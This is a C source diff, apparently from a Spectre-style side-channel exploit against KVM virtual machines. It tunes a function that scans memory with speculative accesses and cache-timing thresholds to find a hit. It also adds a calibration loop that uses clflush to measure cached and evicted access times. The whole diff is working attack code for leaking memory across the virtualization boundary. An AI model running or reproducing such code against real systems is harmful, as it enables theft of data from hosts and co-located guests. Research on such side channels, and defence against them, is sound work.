@@ -1,5 +1,7 @@
 #define _GNU_SOURCE
+#include "asm.h"
 #include "msr.h"
+#include "timing.h"
 #include <bits/time.h>
 #include <err.h>
 #include <errno.h>
@@ -102,7 +104,7 @@ typedef char kvm_lapic[8];
 //   Base
 //
 size_t find_min(void *buf) {
-  const uint64_t MAX_IDX = 0xffffffff;
+  const uint64_t MAX_IDX = 0xfffffffff;
   const int PAGES_IN_BATCH = 256;
   const int ELEMENTS_PER_PAGE = PAGE_SIZE / sizeof(kvm_lapic);
 
@@ -131,11 +133,11 @@ size_t find_min(void *buf) {
       for (int64_t page = PAGES_IN_BATCH - 1; page >= 0; --page) {
         size_t idx = batch + (ELEMENTS_PER_PAGE * page) + offset;
 
-        size_t time = access_buffer_with_spectre(buf, idx, 10);
+        size_t time = access_buffer_with_spectre(buf, idx, 1000);
         if (time < 220) {
-          time = access_buffer_with_spectre(buf, idx, 100);
+          time = access_buffer_with_spectre(buf, idx, 10000);
           if (time < 200) {
-            time = access_buffer_with_spectre(buf, idx, 1000);
+            time = access_buffer_with_spectre(buf, idx, 100000);
             if (time < CACHE_HIT_THRESHOLD) {
               printf("\nHIT!\nidx: %lx\ntime: %ld\n", idx, time);
               return idx;
@@ -154,7 +156,24 @@ size_t find_min(void *buf) {
   return 0;
 }
 
-void cmd_determine(void *leak_page) { access_buffer_with_spectre(leak_page, 1, 1); }
+void cmd_determine(void *leak_page) {
+  size_t cached = -1;
+  size_t evicted = -1;
+
+  size_t iters = 10000000;
+  fprintf(stderr, "Flushing %ld times...\n", iters);
+  for (size_t i = 0; i < iters; ++i) {
+    maccess(leak_page);
+    size_t x = access_time(leak_page);
+    cached = x < cached ? x : cached;
+    clflush(leak_page);
+    x = access_time(leak_page);
+    evicted = x < evicted ? x : evicted;
+  }
+
+  printf("Cached: %ld\tEvicted: %ld\n", cached, evicted);
+  access_buffer_with_spectre(leak_page, 1, 1);
+}
 
 void cmd_calc(int argc, char *argv[argc]) {
   if (argc < 2) {
